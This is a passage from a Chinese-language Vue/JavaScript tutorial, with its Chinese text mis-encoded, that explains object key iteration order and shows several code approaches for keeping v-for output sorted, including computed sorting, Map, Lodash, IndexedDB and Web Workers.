<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'for...in:'</span>, (<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> keys = []
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> mixedObj) keys.<span class="hljs-title function_">push</span>(key)
  <span class="hljs-keyword">return</span> keys
})())
<span class="hljs-comment">// Object.keys: ['1', '2', 'a', 'b', 'c']</span>
<span class="hljs-comment">// for...in: ['1', '2', 'a', 'b', 'c']</span>
<span class="hljs-comment">// æ•°å­—é”®åœ¨å‰ä¸”æ’åºï¼Œå­—ç¬¦ä¸²é”®åœ¨åæŒ‰æ’å…¥é¡ºåº</span>
</code></pre>
<h4 data-id="heading-3">1.2 ES6+ å¯¹è±¡é¡ºåºè§„åˆ™</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ES6 è§„èŒƒå®šä¹‰çš„é”®éå†é¡ºåºï¼š</span>
<span class="hljs-comment">// 1. æ•°å­—é”®ï¼ˆåŒ…æ‹¬è´Ÿæ•°ã€æµ®ç‚¹æ•°ï¼‰æŒ‰æ•°å€¼å‡åº</span>
<span class="hljs-comment">// 2. å­—ç¬¦ä¸²é”®æŒ‰æ’å…¥é¡ºåº</span>
<span class="hljs-comment">// 3. Symbol é”®æŒ‰æ’å…¥é¡ºåº</span>

<span class="hljs-keyword">const</span> es6Obj = {
  <span class="hljs-string">'-1'</span>: <span class="hljs-string">'minus one'</span>,
  <span class="hljs-string">'0.5'</span>: <span class="hljs-string">'half'</span>,
  <span class="hljs-string">'2'</span>: <span class="hljs-string">'two'</span>,
  <span class="hljs-string">'1'</span>: <span class="hljs-string">'one'</span>,
  <span class="hljs-string">'b'</span>: <span class="hljs-string">'bravo'</span>,
  <span class="hljs-string">'a'</span>: <span class="hljs-string">'alpha'</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'sym1'</span>)]: <span class="hljs-string">'symbol1'</span>,
  <span class="hljs-string">'c'</span>: <span class="hljs-string">'charlie'</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'sym2'</span>)]: <span class="hljs-string">'symbol2'</span>
}

<span class="hljs-keyword">const</span> keys = []
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> es6Obj) {
  keys.<span class="hljs-title function_">push</span>(key)
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'éå†é¡ºåº:'</span>, keys)
<span class="hljs-comment">// è¾“å‡º: ['-1', '0.5', '1', '2', 'b', 'a', 'c']</span>
<span class="hljs-comment">// Symbol é”®ä¸ä¼šåœ¨ for...in ä¸­å‡ºç°</span>
</code></pre>
<h3 data-id="heading-4">äºŒã€Vue v-for éå†å¯¹è±¡çš„æœºåˆ¶</h3>
<h4 data-id="heading-5">2.1 Vue 2 çš„éå†æœºåˆ¶</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;!-- Vue 2 ä½¿ç”¨ Object.keys() è·å–é”® --&gt;
    &lt;div v-for="(value, key) in myObject" :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      myObject: {
        '3': 'three',
        '1': 'one',
        'z': 'zebra',
        'a': 'apple',
        '2': 'two'
      }
    }
  },
  mounted() {
    console.log('Vue 2 ä½¿ç”¨çš„é”®:', Object.keys(this.myObject))
    // è¾“å‡º: ['1', '2', '3', 'z', 'a']
    // é¡ºåº: æ•°å­—é”®æ’åº + å­—ç¬¦ä¸²é”®æŒ‰åˆ›å»ºé¡ºåº
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-6">2.2 Vue 3 çš„éå†æœºåˆ¶</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;!-- Vue 3 åŒæ ·ä½¿ç”¨ Object.keys() --&gt;
    &lt;div v-for="(value, key, index) in myObject" :key="key"&gt;
      {{ index }}. {{ key }}: {{ value }}
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { reactive } from 'vue'

const myObject = reactive({
  '10': 'ten',
  '2': 'two',
  'banana': 'ğŸŒ',
  '1': 'one',
  'apple': 'ğŸ'
})

console.log('Vue 3 ä½¿ç”¨çš„é”®:', Object.keys(myObject))
// è¾“å‡º: ['1', '2', '10', 'banana', 'apple']
// æ³¨æ„: '10' åœ¨ '2' åé¢ï¼Œå› ä¸ºæŒ‰æ•°å­—æ¯”è¾ƒæ’åº
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-7">ä¸‰ã€ä¿è¯éå†é¡ºåºçš„ 10 ç§æ–¹æ³•</h3>
<h4 data-id="heading-8">3.1 æ–¹æ³•1ï¼šä½¿ç”¨è®¡ç®—å±æ€§æ’åºï¼ˆæ¨èï¼‰</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•1ï¼šè®¡ç®—å±æ€§æ’åº&lt;/h3&gt;
    
    &lt;!-- æŒ‰é”®åæ’åº --&gt;
    &lt;div v-for="(value, key) in sortedByKey" :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
    
    &lt;!-- æŒ‰å€¼æ’åº --&gt;
    &lt;div v-for="item in sortedByValue" :key="item.key"&gt;
      {{ item.key }}: {{ item.value }}
    &lt;/div&gt;
    
    &lt;!-- è‡ªå®šä¹‰æ’åºè§„åˆ™ --&gt;
    &lt;div v-for="item in customSorted" :key="item.key"&gt;
      {{ item.key }}: {{ item.value }}
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      userData: {
        'age': 25,
        'name': 'å¼ ä¸‰',
        'score': 95,
        'email': 'zhangsan@example.com',
        'created_at': '2023-01-15',
        'z-index': 3,
        'address': 'åŒ—äº¬å¸‚'
      }
    }
  },
  computed: {
    // 1. æŒ‰é”®åå­—æ¯é¡ºåº
    sortedByKey() {
      const obj = this.userData
      const sorted = {}
      Object.keys(obj)
        .sort()
        .forEach(key =&gt; {
          sorted[key] = obj[key]
        })
      return sorted
    },
    
    // 2. æŒ‰é”®åé•¿åº¦æ’åº
    sortedByKeyLength() {
      const obj = this.userData
      return Object.keys(obj)
        .sort((a, b) =&gt; a.length - b.length)
        .reduce((acc, key) =&gt; {
          acc[key] = obj[key]
          return acc
        }, {})
    },
    
    // 3. æŒ‰å€¼æ’åºï¼ˆè½¬æ¢ä¸ºæ•°ç»„ï¼‰
    sortedByValue() {
      const obj = this.userData
      return Object.entries(obj)
        .sort(([, valueA], [, valueB]) =&gt; {
          if (typeof valueA === 'string' &amp;&amp; typeof valueB === 'string') {
            return valueA.localeCompare(valueB)
          }
          return valueA - valueB
        })
        .map(([key, value]) =&gt; ({ key, value }))
    },
    
    // 4. è‡ªå®šä¹‰ä¼˜å…ˆçº§æ’åº
    customSorted() {
      const priority = {
        'name': 1,
        'age': 2,
        'email': 3,
        'score': 4,
        'address': 5,
        'created_at': 6,
        'z-index': 7
      }
      
      return Object.entries(this.userData)
        .sort(([keyA], [keyB]) =&gt; {
          const priorityA = priority[keyA] || 999
          const priorityB = priority[keyB] || 999
          return priorityA - priorityB
        })
        .map(([key, value]) =&gt; ({ key, value }))
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-9">3.2 æ–¹æ³•2ï¼šä½¿ç”¨ Map ä¿æŒæ’å…¥é¡ºåº</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•2ï¼šä½¿ç”¨ Map ä¿æŒæ’å…¥é¡ºåº&lt;/h3&gt;
    
    &lt;!-- Map ä¿æŒæ’å…¥é¡ºåº --&gt;
    &lt;div v-for="[key, value] in myMap" :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
    
    &lt;!-- å“åº”å¼ Map --&gt;
    &lt;div v-for="[key, value] in reactiveMap" :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import { reactive } from 'vue'

export default {
  data() {
    return {
      // æ™®é€š Mapï¼ˆVue 2ï¼‰
      myMap: new Map([
        ['zebra', 'ğŸ¦“'],
        ['apple', 'ğŸ'],
        ['3', 'three'],
        ['1', 'one'],
        ['banana', 'ğŸŒ']
      ])
    }
  },
  setup() {
    // å“åº”å¼ Mapï¼ˆVue 3ï¼‰
    const reactiveMap = reactive(new Map([
      ['zebra', 'ğŸ¦“'],
      ['apple', 'ğŸ'],
      ['3', 'three'],
      ['1', 'one'],
      ['banana', 'ğŸŒ']
    ]))
    
    // Map æ“ä½œç¤ºä¾‹
    const addToMap = () =&gt; {
      reactiveMap.set('cherry', 'ğŸ’')
    }
    
    const sortMap = () =&gt; {
      const sorted = new Map(
        [...reactiveMap.entries()].sort(([keyA], [keyB]) =&gt; 
          keyA.localeCompare(keyB)
        )
      )
      // æ¸…ç©ºå¹¶é‡æ–°è®¾ç½®
      reactiveMap.clear()
      sorted.forEach((value, key) =&gt; reactiveMap.set(key, value))
    }
    
    return {
      reactiveMap,
      addToMap,
      sortMap
    }
  },
  computed: {
    // å°† Map è½¬æ¢ä¸ºæ•°ç»„ä¾› v-for ä½¿ç”¨
    mapEntries() {
      return Array.from(this.myMap.entries())
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-10">3.3 æ–¹æ³•3ï¼šä½¿ç”¨æ•°ç»„å­˜å‚¨é¡ºåºä¿¡æ¯</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•3ï¼šä½¿ç”¨æ•°ç»„å­˜å‚¨é¡ºåº&lt;/h3&gt;
    
    &lt;!-- æ–¹æ¡ˆAï¼šé”®æ•°ç»„ + å¯¹è±¡ --&gt;
    &lt;div v-for="key in keyOrder" :key="key"&gt;
      {{ key }}: {{ dataObject[key] }}
    &lt;/div&gt;
    
    &lt;!-- æ–¹æ¡ˆBï¼šå¯¹è±¡æ•°ç»„ --&gt;
    &lt;div v-for="item in orderedItems" :key="item.key"&gt;
      {{ item.key }}: {{ item.value }}
    &lt;/div&gt;
    
    &lt;!-- æ–¹æ¡ˆCï¼šå¸¦æ’åºä¿¡æ¯çš„å¯¹è±¡ --&gt;
    &lt;div v-for="item in orderedData" :key="item.id"&gt;
      {{ item.key }}: {{ item.value }} (é¡ºåº: {{ item.order }})
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      // æ–¹æ¡ˆAï¼šåˆ†ç¦»çš„é”®é¡ºåºå’Œå¯¹è±¡
      keyOrder: ['name', 'age', 'email', 'score', 'address'],
      dataObject: {
        'name': 'å¼ ä¸‰',
        'age': 25,
        'email': 'zhangsan@example.com',
        'score': 95,
        'address': 'åŒ—äº¬å¸‚'
      },
      
      // æ–¹æ¡ˆBï¼šç›´æ¥ä½¿ç”¨å¯¹è±¡æ•°ç»„
      orderedItems: [
        { key: 'name', value: 'å¼ ä¸‰' },
        { key: 'age', value: 25 },
        { key: 'email', value: 'zhangsan@example.com' },
        { key: 'score', value: 95 },
        { key: 'address', value: 'åŒ—äº¬å¸‚' }
      ],
      
      // æ–¹æ¡ˆCï¼šåŒ…å«é¡ºåºä¿¡æ¯çš„å¯¹è±¡æ•°ç»„
      orderedData: [
        { id: 1, key: 'name', value: 'å¼ ä¸‰', order: 1 },
        { id: 2, key: 'age', value: 25, order: 2 },
        { id: 3, key: 'email', value: 'zhangsan@example.com', order: 3 },
        { id: 4, key: 'score', value: 95, order: 4 },
        { id: 5, key: 'address', value: 'åŒ—äº¬å¸‚', order: 5 }
      ]
    }
  },
  methods: {
    // åŠ¨æ€æ”¹å˜é¡ºåº
    moveItemUp(key) {
      const index = this.keyOrder.indexOf(key)
      if (index &gt; 0) {
        const temp = this.keyOrder[index]
        this.keyOrder[index] = this.keyOrder[index - 1]
        this.keyOrder[index - 1] = temp
        
        // å¼ºåˆ¶æ›´æ–°ï¼ˆVue 2ï¼‰
        this.$forceUpdate()
      }
    },
    
    // æ’åº orderedItems
    sortByKey() {
      this.orderedItems.sort((a, b) =&gt; a.key.localeCompare(b.key))
    },
    
    sortByValue() {
      this.orderedItems.sort((a, b) =&gt; {
        if (typeof a.value === 'string' &amp;&amp; typeof b.value === 'string') {
          return a.value.localeCompare(b.value)
        }
        return a.value - b.value
      })
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-11">3.4 æ–¹æ³•4ï¼šä½¿ç”¨ Lodash æ’åºå·¥å…·</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•4ï¼šä½¿ç”¨ Lodash æ’åº&lt;/h3&gt;
    
    &lt;div v-for="(value, key) in sortedByLodash" :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
    
    &lt;div v-for="item in sortedByCustom" :key="item.key"&gt;
      {{ item.key }}: {{ item.value }}
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import _ from 'lodash'

export default {
  data() {
    return {
      config: {
        'debug': true,
        'timeout': 5000,
        'retries': 3,
        'host': 'api.example.com',
        'port': 8080,
        'api_version': 'v2',
        'cache_size': 1000
      }
    }
  },
  computed: {
    // 1. ä½¿ç”¨ lodash çš„ toPairs å’Œ sortBy
    sortedByLodash() {
      return _.chain(this.config)
        .toPairs()  // è½¬æ¢ä¸º [key, value] æ•°ç»„
        .sortBy([0])  // æŒ‰ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆkeyï¼‰æ’åº
        .fromPairs()  // è½¬æ¢å›å¯¹è±¡
        .value()
    },
    
    // 2. æŒ‰ key é•¿åº¦æ’åº
    sortedByKeyLength() {
      return _.chain(this.config)
        .toPairs()
        .sortBy([pair =&gt; pair[0].length])  // æŒ‰ key é•¿åº¦æ’åº
        .fromPairs()
        .value()
    },
    
    // 3. è‡ªå®šä¹‰æ’åºå‡½æ•°
    sortedByCustom() {
      const priority = {
        'host': 1,
        'port': 2,
        'api_version': 3,
        'timeout': 4,
        'retries': 5,
        'cache_size': 6,
        'debug': 7
      }
      
      return _.chain(this.config)
        .toPairs()
        .sortBy([
          ([key]) =&gt; priority[key] || 999,  // æŒ‰ä¼˜å…ˆçº§
          ([key]) =&gt; key                    // æ¬¡è¦ç”¨ key æ’åº
        ])
        .map(([key, value]) =&gt; ({ key, value }))
        .value()
    },
    
    // 4. æŒ‰å€¼ç±»å‹åˆ†ç»„æ’åº
    sortedByValueType() {
      return _.chain(this.config)
        .toPairs()
        .groupBy(([, value]) =&gt; typeof value)  // æŒ‰å€¼ç±»å‹åˆ†ç»„
        .toPairs()  // è½¬æ¢ä¸º [ç±»å‹, æ¡ç›®æ•°ç»„]
        .sortBy([0])  // æŒ‰ç±»å‹æ’åº
        .flatMap(([, entries]) =&gt; 
          entries.sort(([keyA], [keyB]) =&gt; keyA.localeCompare(keyB))
        )
        .fromPairs()
        .value()
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-12">3.5 æ–¹æ³•5ï¼šä½¿ç”¨è‡ªå®šä¹‰æŒ‡ä»¤</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•5ï¼šè‡ªå®šä¹‰æœ‰åºéå†æŒ‡ä»¤&lt;/h3&gt;
    
    &lt;!-- ä½¿ç”¨è‡ªå®šä¹‰æŒ‡ä»¤ --&gt;
    &lt;div v-for="(value, key) in myObject" 
         v-ordered:key 
         :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
    
    &lt;!-- æŒ‡å®šæ’åºè§„åˆ™ --&gt;
    &lt;div v-for="(value, key) in myObject" 
         v-ordered:value="'desc'"
         :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
// è‡ªå®šä¹‰æœ‰åºéå†æŒ‡ä»¤
const orderedDirective = {
  beforeMount(el, binding) {
    const parent = el.parentNode
    const items = Array.from(parent.children)
    
    // è·å–æ’åºè§„åˆ™
    const sortBy = binding.arg // 'key' æˆ– 'value'
    const order = binding.value || 'asc' // 'asc' æˆ– 'desc'
    
    // æå–æ•°æ®
    const data = items.map(item =&gt; {
      const text = item.textContent
      const match = text.match(/(.+): (.+)/)
      return match ? { key: match[1].trim(), value: match[2].trim(), element: item } : null
    }).filter(Boolean)
    
    // æ’åº
    data.sort((a, b) =&gt; {
      let comparison = 0
      
      if (sortBy === 'key') {
        comparison = a.key.localeCompare(b.key)
      } else if (sortBy === 'value') {
        const valA = isNaN(a.value) ? a.value : Number(a.value)
        const valB = isNaN(b.value) ? b.value : Number(b.value)
        
        if (typeof valA === 'string' &amp;&amp; typeof valB === 'string') {
          comparison = valA.localeCompare(valB)
        } else {
          comparison = valA - valB
        }
      }
      
      return order === 'desc' ? -comparison : comparison
    })
    
    // é‡æ–°æ’åº DOM
    data.forEach(item =&gt; {
      parent.appendChild(item.element)
    })
  }
}

export default {
  directives: {
    ordered: orderedDirective
  },
  data() {
    return {
      myObject: {
        'zebra': 'Zoo animal',
        'apple': 'Fruit',
        '3': 'Number',
        '1': 'First',
        'banana': 'Yellow fruit'
      }
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-13">3.6 æ–¹æ³•6ï¼šVue 3 çš„å“åº”å¼æ’åº</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•6ï¼šVue 3 å“åº”å¼æ’åº&lt;/h3&gt;
    
    &lt;!-- å“åº”å¼æ’åºå¯¹è±¡ --&gt;
    &lt;div v-for="(value, key) in sortedObject" :key="key"&gt;
      {{ key }}: {{ value }}
    &lt;/div&gt;
    
    &lt;button @click="changeSortOrder"&gt;åˆ‡æ¢æ’åº&lt;/button&gt;
    &lt;button @click="addNewItem"&gt;æ·»åŠ æ–°é¡¹&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { reactive, computed, watchEffect } from 'vue'

// åŸå§‹æ•°æ®
const rawData = reactive({
  'zebra': { name: 'Zebra', type: 'animal', priority: 3 },
  'apple': { name: 'Apple', type: 'fruit', priority: 1 },
  'banana': { name: 'Banana', type: 'fruit', priority: 2 },
  'carrot': { name: 'Carrot', type: 'vegetable', priority: 4 }
})

// æ’åºé…ç½®
const sortConfig = reactive({
  key: 'priority', // 'priority' | 'name' | 'type'
  order: 'asc'     // 'asc' | 'desc'
})

// å“åº”å¼æ’åºå¯¹è±¡
const sortedObject = computed(() =&gt; {
  const entries = Object.entries(rawData)
  
  entries.sort(([, a], [, b]) =&gt; {
    let comparison = 0
    
    if (sortConfig.key === 'priority') {
      comparison = a.priority - b.priority
    } else if (sortConfig.key === 'name') {
      comparison = a.name.localeCompare(b.name)
    } else if (sortConfig.key === 'type') {
      comparison = a.type.localeCompare(b.type)
    }
    
    return sortConfig.order === 'desc' ? -comparison : comparison
  })
  
  // è½¬æ¢å›å¯¹è±¡ï¼ˆä½†é¡ºåºåœ¨å¯¹è±¡ä¸­ä¸ä¿ç•™ï¼‰
  // æ‰€ä»¥è¿”å›æ•°ç»„ä¾› v-for ä½¿ç”¨
  return entries
})

// æ–¹æ³•
const changeSortOrder = () =&gt; {
  const keys = ['priority', 'name', 'type']
  const orders = ['asc', 'desc']
  
  const currentKeyIndex = keys.indexOf(sortConfig.key)
  sortConfig.key = keys[(currentKeyIndex + 1) % keys.length]
  
  // åˆ‡æ¢ key æ—¶é‡ç½® order
  if (currentKeyIndex === keys.length - 1) {
    const currentOrderIndex = orders.indexOf(sortConfig.order)
    sortConfig.order = orders[(currentOrderIndex + 1) % orders.length]
  }
}

const addNewItem = () =&gt; {
  const fruits = ['grape', 'orange', 'kiwi', 'mango']
  const randomFruit = fruits[Math.floor(Math.random() * fruits.length)]
  
  rawData[randomFruit] = {
    name: randomFruit.charAt(0).toUpperCase() + randomFruit.slice(1),
    type: 'fruit',
    priority: Object.keys(rawData).length + 1
  }
}

// ç›‘å¬æ’åºå˜åŒ–
watchEffect(() =&gt; {
  console.log('å½“å‰æ’åº:', sortConfig.key, sortConfig.order)
  console.log('æ’åºç»“æœ:', sortedObject.value)
})
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-14">3.7 æ–¹æ³•7ï¼šæœåŠ¡ç«¯æ’åº</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•7ï¼šæœåŠ¡ç«¯æ’åº&lt;/h3&gt;
    
    &lt;!-- æ˜¾ç¤ºæ’åºåçš„æ•°æ® --&gt;
    &lt;div v-for="item in sortedData" :key="item.key"&gt;
      {{ item.key }}: {{ item.value }}
    &lt;/div&gt;
    
    &lt;!-- æ’åºé€‰é¡¹ --&gt;
    &lt;div class="sort-controls"&gt;
      &lt;button @click="fetchData('key')"&gt;æŒ‰é”®æ’åº&lt;/button&gt;
      &lt;button @click="fetchData('value')"&gt;æŒ‰å€¼æ’åº&lt;/button&gt;
      &lt;button @click="fetchData('created_at')"&gt;æŒ‰åˆ›å»ºæ—¶é—´&lt;/button&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import axios from 'axios'

export default {
  data() {
    return {
      rawData: {},
      sortedData: [],
      isLoading: false,
      currentSort: 'key'
    }
  },
  
  created() {
    this.fetchData()
  },
  
  methods: {
    async fetchData(sortBy = 'key') {
      this.isLoading = true
      this.currentSort = sortBy
      
      try {
        // è°ƒç”¨APIè·å–æ’åºåçš„æ•°æ®
        const response = await axios.get('/api/data', {
          params: {
            sort_by: sortBy,
            order: 'asc'
          }
        })
        
        this.rawData = response.data
        
        // è½¬æ¢ä¸ºæ•°ç»„ä¾› v-for ä½¿ç”¨
        this.sortedData = Object.entries(this.rawData)
          .map(([key, value]) =&gt; ({ key, value }))
          
      } catch (error) {
        console.error('è·å–æ•°æ®å¤±è´¥:', error)
      } finally {
        this.isLoading = false
      }
    },
    
    // æ¨¡æ‹ŸAPIå“åº”æ ¼å¼
    mockApiResponse(sortBy) {
      // æ¨¡æ‹ŸæœåŠ¡ç«¯æ’åºé€»è¾‘
      const data = {
        'user_003': { name: 'Charlie', score: 85, created_at: '2023-03-01' },
        'user_001': { name: 'Alice', score: 95, created_at: '2023-01-01' },
        'user_002': { name: 'Bob', score: 90, created_at: '2023-02-01' }
      }
      
      const entries = Object.entries(data)
      
      // æœåŠ¡ç«¯æ’åºé€»è¾‘
      entries.sort(([keyA, valueA], [keyB, valueB]) =&gt; {
        if (sortBy === 'key') {
          return keyA.localeCompare(keyB)
        } else if (sortBy === 'value') {
          return valueA.name.localeCompare(valueB.name)
        } else if (sortBy === 'created_at') {
          return new Date(valueA.created_at) - new Date(valueB.created_at)
        }
        return 0
      })
      
      // è½¬æ¢ä¸ºå¯¹è±¡ï¼ˆæŒ‰é¡ºåºï¼‰
      const result = {}
      entries.forEach(([key, value]) =&gt; {
        result[key] = value
      })
      
      return result
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-15">3.8 æ–¹æ³•8ï¼šä½¿ç”¨ IndexedDB å­˜å‚¨é¡ºåº</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;h3&gt;æ–¹æ³•8ï¼šIndexedDB å­˜å‚¨é¡ºåº&lt;/h3&gt;
    
    &lt;!-- æ˜¾ç¤ºæ•°æ® --&gt;
    &lt;div v-for="item in sortedItems" :key="item.id"&gt;
      {{ item.key }}: {{ item.value }}
      &lt;button @click="moveUp(item.id)"&gt;ä¸Šç§»&lt;/button&gt;
      &lt;button @click="moveDown(item.id)"&gt;ä¸‹ç§»&lt;/button&gt;
    &lt;/div&gt;
    
    &lt;button @click="addItem"&gt;æ·»åŠ æ–°é¡¹&lt;/button&gt;
    &lt;button @click="saveOrder"&gt;ä¿å­˜é¡ºåº&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
// IndexedDB å·¥å…·ç±»
class OrderDB {
  constructor(dbName = 'OrderDB', storeName = 'items') {
    this.dbName = dbName
    this.storeName = storeName
    this.db = null
  }
  
  async open() {
    return new Promise((resolve, reject) =&gt; {
      const request = indexedDB.open(this.dbName, 1)
      
      request.onupgradeneeded = (event) =&gt; {
        const db = event.target.result
        if (!db.objectStoreNames.contains(this.storeName)) {
          const store = db.createObjectStore(this.storeName, { keyPath: 'id' })
          store.createIndex('order', 'order', { unique: false })
        }
      }
      
      request.onsuccess = (event) =&gt; {
        this.db = event.target.result
        resolve(this.db)
      }
      
      request.onerror = (event) =&gt; {
        reject(event.target.error)
      }
    })
  }
  
  async saveOrder(items) {
    return new Promise((resolve, reject) =&gt; {
      const transaction = this.db.transaction([this.storeName], 'readwrite')
      const store = transaction.objectStore(this.storeName)
      
      // æ¸…ç©ºç°æœ‰æ•°æ®
      const clearRequest = store.clear()
      
      clearRequest.onsuccess = () =&gt; {
        // ä¿å­˜æ–°æ•°æ®
        items.forEach((item, index) =&gt; {
          item.order = index
          store.put(item)
        })
        
        transaction.oncomplete = () =&gt; resolve()
        transaction.onerror = (event) =&gt; reject(event.target.error)
      }
      
      clearRequest.onerror = (event) =&gt; reject(event.target.error)
    })
  }
  
  async loadOrder() {
    return new Promise((resolve, reject) =&gt; {
      const transaction = this.db.transaction([this.storeName], 'readonly')
      const store = transaction.objectStore(this.storeName)
      const index = store.index('order')
      const request = index.getAll()
      
      request.onsuccess = (event) =&gt; {
        resolve(event.target.result)
      }
      
      request.onerror = (event) =&gt; {
        reject(event.target.error)
      }
    })
  }
}

export default {
  data() {
    return {
      db: null,
      items: [
        { id: 1, key: 'name', value: 'å¼ ä¸‰', order: 0 },
        { id: 2, key: 'age', value: 25, order: 1 },
        { id: 3, key: 'email', value: 'zhangsan@example.com', order: 2 },
        { id: 4, key: 'score', value: 95, order: 3 }
      ]
    }
  },
  
  computed: {
    sortedItems() {
      return [...this.items].sort((a, b) =&gt; a.order - b.order)
    }
  },
  
  async created() {
    this.db = new OrderDB()
    await this.db.open()
    
    // å°è¯•åŠ è½½ä¿å­˜çš„é¡ºåº
    const savedItems = await this.db.loadOrder()
    if (savedItems &amp;&amp; savedItems.length &gt; 0) {
      this.items = savedItems
    }
  },
  
  methods: {
    moveUp(id) {
      const index = this.items.findIndex(item =&gt; item.id === id)
      if (index &gt; 0) {
        const temp = this.items[index].order
        this.items[index].order = this.items[index - 1].order
        this.items[index - 1].order = temp
      }
    },
    
    moveDown(id) {
      const index = this.items.findIndex(item =&gt; item.id === id)
      if (index &lt; this.items.length - 1) {
        const temp = this.items[index].order
        this.items[index].order = this.items[index + 1].order
        this.items[index + 1].order = temp
      }
    },
    
    addItem() {
      const newId = Math.max(...this.items.map(item =&gt; item.id)) + 1
      this.items.push({
        id: newId,
        key: `item_${newId}`,
        value: `å€¼ ${newId}`,
        order: this.items.length
      })
    },
    
    async saveOrder() {
      await this.db.saveOrder(this.items)
      alert('é¡ºåºå·²ä¿å­˜åˆ°æœ¬åœ°æ•°æ®åº“')
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-16">3.9 æ–¹æ³•9ï¼šWeb Worker åå°æ’åº</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// worker.js</span>
self.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">const</span> { data, sortBy, order } = event.<span class="hljs-property">data</span>
  
  <span class="hljs-comment">// åœ¨ Worker ä¸­è¿›è¡Œå¤æ‚çš„æ’åºè®¡ç®—</span>
  <span class="hljs-keyword">const</span> sorted = <span class="hljs-title function_">sortData</span>(data, sortBy, order)
  
  self.<span class="hljs-title function_">postMessage</span>(sorted)
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">sortData</span>(<span class="hljs-params">data, sortBy, order = <span class="hljs-string">'asc'</span></span>) {
  <span class="hljs-keyword">const</span> entries = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(data)
  
  entries.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">[keyA, valueA], [keyB, valueB]</span>) =&gt;</span> {
    <span class="hljs-keyword">let</span> comparison = <span class="hljs-number">0</span>
    
    <span class="hljs-comment">// å¤æ‚çš„æ’åºé€»è¾‘</span>
    <span class="hljs-keyword">if</span> (sortBy === <span class="hljs-string">'complex'</span>) {
      <span class="hljs-comment">// æ¨¡æ‹Ÿå¤æ‚è®¡ç®—</span>
      <span class="hljs-keyword">const</span> weightA = <span class="hljs-title function_">calculateWeight</span>(keyA, valueA)
      <span class="hljs-keyword">const</span> weightB = <span class="hljs-title function_">calculateWeight</span>(keyB, valueB)
      comparison = weightA - weightB
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sortBy === <span class="hljs-string">'key'</span>) {
      comparison = keyA.<span class="hljs-title function_">localeCompare</span>(keyB)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sortBy === <span class="hljs-string">'value'</span>) {
